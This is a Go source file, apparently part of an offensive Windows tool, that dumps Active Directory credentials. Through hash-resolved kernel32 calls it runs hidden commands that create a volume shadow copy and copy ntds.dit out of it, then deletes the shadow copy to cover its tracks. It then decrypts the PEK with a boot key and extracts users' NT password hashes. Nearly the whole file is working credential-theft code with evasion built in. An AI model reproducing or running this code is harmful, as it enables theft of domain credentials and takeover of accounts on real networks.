package creds

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	"github.com/Velocidex/ordereddict"
	wc "github.com/carved4/go-wincall"
	"www.velocidex.com/golang/go-ese/parser"
)

const (
	ATT_OBJECT_NAME		= 0x00090001
	ATT_DISTINGUISHED_NAME	= 0x00090003
	ATT_PEK_LIST		= 0x00090481
	ATT_UNICODE_PWD		= 0x0009005A
	ATT_SAM_ACCOUNT_NAME	= 0x000902b0
)

type STARTUPINFO struct {
	cb		uint32
	lpReserved	*uint16
	lpDesktop	*uint16
	lpTitle		*uint16
	dwX		uint32
	dwY		uint32
	dwXSize		uint32
	dwYSize		uint32
	dwXCountChars	uint32
	dwYCountChars	uint32
	dwFillAttribute	uint32
	dwFlags		uint32
	wShowWindow	uint16
	cbReserved2	uint16
	lpReserved2	*byte
	hStdInput	uintptr
	hStdOutput	uintptr
	hStdError	uintptr
}

type SECURITY_ATTRIBUTES struct {
	nLength			uint32
	lpSecurityDescriptor	uintptr
	bInheritHandle		uint32
}

type PROCESS_INFORMATION struct {
	hProcess	uintptr
	hThread		uintptr
	dwProcessId	uint32
	dwThreadId	uint32
}

func execCmd(cmd string) string {
	kernel32base := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	createProcessW := wc.GetFunctionAddress(kernel32base, wc.GetHash("CreateProcessW"))
	CloseHandle := wc.GetFunctionAddress(kernel32base, wc.GetHash("CloseHandle"))
	createPipe := wc.GetFunctionAddress(kernel32base, wc.GetHash("CreatePipe"))
	readFile := wc.GetFunctionAddress(kernel32base, wc.GetHash("ReadFile"))
	waitForSingleObject := wc.GetFunctionAddress(kernel32base, wc.GetHash("WaitForSingleObject"))
	var hRead, hWrite uintptr

	sa := SECURITY_ATTRIBUTES{
		nLength:		uint32(unsafe.Sizeof(SECURITY_ATTRIBUTES{})),
		lpSecurityDescriptor:	0,
		bInheritHandle:		1,
	}

	ret, _, _ := wc.CallG0(createPipe, uintptr(unsafe.Pointer(&hRead)), uintptr(unsafe.Pointer(&hWrite)), uintptr(unsafe.Pointer(&sa)), 0)
	if ret == 0 {
		return ""
	}

	var si STARTUPINFO
	si.cb = uint32(unsafe.Sizeof(si))
	const STARTF_USESTDHANDLES = 0x00000100
	si.dwFlags = STARTF_USESTDHANDLES
	si.hStdOutput = hWrite
	si.hStdError = hWrite

	var pi PROCESS_INFORMATION

	cmdPtr, _ := wc.UTF16ptr(cmd)

	const CREATE_NO_WINDOW = 0x08000000

	ret, _, _ = wc.CallG0(
		createProcessW,
		0,
		uintptr(unsafe.Pointer(cmdPtr)),
		0,
		0,
		1,
		CREATE_NO_WINDOW,
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return ""
	}

	wc.CallG0(CloseHandle, hWrite)

	const INFINITE = 0xFFFFFFFF
	wc.CallG0(waitForSingleObject, pi.hProcess, INFINITE)

	var output []byte
	buffer := make([]byte, 256)
	var bytesRead uint32

	for {
		ret, _, _ := wc.CallG0(
			readFile,
			hRead,
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(len(buffer)),
			uintptr(unsafe.Pointer(&bytesRead)),
			0,
		)

		if ret == 0 || bytesRead == 0 {
			break
		}
		output = append(output, buffer[:bytesRead]...)
	}

	if pi.hProcess != 0 {
		wc.CallG0(CloseHandle, pi.hProcess)
	}
	if pi.hThread != 0 {
		wc.CallG0(CloseHandle, pi.hThread)
	}
	if hRead != 0 {
		wc.CallG0(CloseHandle, hRead)
	}

	return string(output)
}

func createNTDSCopy() (string, error) {
	output := execCmd("vssadmin create shadow /for=C:")
	if output == "" {
		return "", fmt.Errorf("failed to create shadow copy")
	}
	var shadowPath string
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		if strings.Contains(line, "Shadow Copy Volume Name:") || strings.Contains(line, "Shadow Copy Volume:") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				shadowPath = strings.TrimSpace(strings.Join(parts[1:], ":"))
				break
			}
		}
	}

	if shadowPath == "" {
		return "", fmt.Errorf("failed to parse shadow copy path from output: %s", output)
	}

	ntdsSourcePath := filepath.Join(shadowPath, "Windows", "NTDS", "ntds.dit")

	cwd, err := os.Getwd()
	if err != nil {
		return "", fmt.Errorf("failed to get current directory: %v", err)
	}

	ntdsDestPath := filepath.Join(cwd, "ntds_copy.dit")

	copyCmd := fmt.Sprintf("cmd.exe /c copy /Y \"%s\" \"%s\"", ntdsSourcePath, ntdsDestPath)
	copyOutput := execCmd(copyCmd)

	if _, err := os.Stat(ntdsDestPath); os.IsNotExist(err) {
		return "", fmt.Errorf("failed to copy ntds.dit: %s", copyOutput)
	}

	var shadowID string
	for _, line := range lines {
		if strings.Contains(line, "Shadow Copy ID:") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				shadowID = strings.TrimSpace(strings.Join(parts[1:], ":"))
				break
			}
		}
	}

	if shadowID != "" {
		deleteCmd := fmt.Sprintf("vssadmin delete shadows /shadow=%s /quiet", shadowID)
		execCmd(deleteCmd)
	}

	return ntdsDestPath, nil
}

type FileReaderAt struct {
	handle	uintptr
	size	uint64
}

func (f *FileReaderAt) ReadAt(p []byte, off int64) (n int, err error) {
	if off < 0 {
		return 0, fmt.Errorf("negative offset")
	}

	if len(p) == 0 {
		return 0, nil
	}

	offsetLow := uint32(off & 0xFFFFFFFF)
	offsetHigh := int32(off >> 32)

	kernel32base := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	setFilePointer := wc.GetFunctionAddress(kernel32base, wc.GetHash("SetFilePointer"))
	readFile := wc.GetFunctionAddress(kernel32base, wc.GetHash("ReadFile"))

	newPosLow, _, _ := wc.CallG0(
		setFilePointer,
		f.handle,
		uintptr(offsetLow),
		uintptr(unsafe.Pointer(&offsetHigh)),
		0,
	)

	if newPosLow == 0xFFFFFFFF {
		return 0, fmt.Errorf("SetFilePointer failed")
	}

	var bytesRead uint32
	ret, _, _ := wc.CallG0(
		readFile,
		f.handle,
		uintptr(unsafe.Pointer(&p[0])),
		uintptr(len(p)),
		uintptr(unsafe.Pointer(&bytesRead)),
		0,
	)

	if ret == 0 {
		return int(bytesRead), fmt.Errorf("ReadFile failed")
	}

	return int(bytesRead), nil
}

func ParseNTDS(ntdsPath string, bootKey []byte) ([]string, error) {
	utf16Path, err := wc.UTF16ptr(ntdsPath)
	if err != nil {
		return nil, fmt.Errorf("failed to convert path: %v", err)
	}

	kernel32base := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	createFileW := wc.GetFunctionAddress(kernel32base, wc.GetHash("CreateFileW"))
	closeHandle := wc.GetFunctionAddress(kernel32base, wc.GetHash("CloseHandle"))

	handle, _, _ := wc.CallG0(
		createFileW,
		uintptr(unsafe.Pointer(utf16Path)),
		GENERIC_READ,
		FILE_SHARE_READ|FILE_SHARE_WRITE,
		0,
		OPEN_EXISTING,
		0,
		0,
	)

	if handle == INVALID_HANDLE_VALUE || handle == 0 {
		return nil, fmt.Errorf("failed to open file")
	}
	defer wc.CallG0(closeHandle, handle)

	reader := &FileReaderAt{handle: handle}

	ctx, err := parser.NewESEContext(reader)
	if err != nil {
		return nil, fmt.Errorf("failed to parse ESE database: %v", err)
	}

	catalog, err := parser.ReadCatalog(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to read catalog: %v", err)
	}

	pek, err := extractPEK(ctx, catalog, bootKey)
	if err != nil {
		return nil, fmt.Errorf("failed to extract PEK: %v", err)
	}

	hashes, err := extractUserHashes(ctx, catalog, pek)
	if err != nil {
		return nil, fmt.Errorf("failed to extract users: %v", err)
	}

	return hashes, nil
}

func extractPEK(ctx *parser.ESEContext, catalog *parser.Catalog, bootKey []byte) ([]byte, error) {
	if len(bootKey) != 16 {
		return nil, fmt.Errorf("invalid bootkey length")
	}

	var encryptedPEK []byte

	err := catalog.DumpTable("datatable", func(row *ordereddict.Dict) error {
		if pekData, ok := row.Get("ATTk590689"); ok {
			if pekStr, ok := pekData.(string); ok && len(pekStr) > 0 {
				encryptedPEK = hexStringToBytes(pekStr)
				if len(encryptedPEK) > 0 {
					return fmt.Errorf("found")
				}
			}
			if pekBytes, ok := pekData.([]byte); ok && len(pekBytes) > 0 {
				encryptedPEK = pekBytes
				return fmt.Errorf("found")
			}
		}
		return nil
	})

	if err != nil && err.Error() != "found" {
		return nil, fmt.Errorf("error scanning table: %v", err)
	}

	if encryptedPEK == nil {
		return nil, fmt.Errorf("PEK not found in datatable")
	}

	pek := decryptPEK(encryptedPEK, bootKey)
	if pek == nil {
		return nil, fmt.Errorf("failed to decrypt PEK")
	}

	return pek, nil
}

func extractUserHashes(ctx *parser.ESEContext, catalog *parser.Catalog, pek []byte) ([]string, error) {
	var hashes []string

	err := catalog.DumpTable("datatable", func(row *ordereddict.Dict) error {
		samAccountName, hasSAM := row.Get("ATTm590045")
		if !hasSAM {
			return nil
		}

		username, ok := samAccountName.(string)
		if !ok || username == "" {
			return nil
		}

		encPwd, hasEncPwd := row.Get("ATTk589914")
		if !hasEncPwd {
			return nil
		}

		var encPwdBytes []byte
		if encStr, ok := encPwd.(string); ok {
			encPwdBytes = hexStringToBytes(encStr)
		} else if encBytes, ok := encPwd.([]byte); ok {
			encPwdBytes = encBytes
		}

		if len(encPwdBytes) == 0 {
			return nil
		}

		ntHash := decryptHashWithPEK(encPwdBytes, pek)
		if ntHash != nil && len(ntHash) == 16 {
			hashLine := fmt.Sprintf("%s:%x", username, ntHash)
			hashes = append(hashes, hashLine)
		}

		return nil
	})

	if err != nil {
		return nil, err
	}

	return hashes, nil
}

func isPrintableBytes(b []byte) bool {
	for _, c := range b {
		if c < 32 || c > 126 {
			return false
		}
	}
	return true
}

